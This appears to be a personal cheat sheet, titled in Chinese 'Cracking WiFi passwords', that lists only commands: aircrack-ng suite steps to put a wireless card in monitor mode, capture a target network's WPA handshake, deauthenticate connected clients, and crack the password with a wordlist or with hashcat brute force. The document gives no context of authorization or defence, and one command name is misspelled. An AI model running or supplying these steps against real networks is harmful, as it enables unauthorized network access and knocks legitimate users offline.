#  破解 WiFi  密码

```bash
sudo airmon-ng
```



```bash
sudo airmon-ng start wlan0
```



```bash
sudo airodumo-ng wlan0mon
```



```bash
sudo airodump-ng --bssid xxxx -c 6 -w ./test wlan0mon
```



```bash
sudo aireplay-ng --deauth 15 -a xxxx wlan0mon
```



```bash
sudo aircrack-ng --bssid xxx -w pass.txt test.cap
```



hashcat:

[在线转换格式](https://hashcat.net/cap2hccapx/)



```bash
hashcat -m 2500 -a 3 wpahash.hccap
```

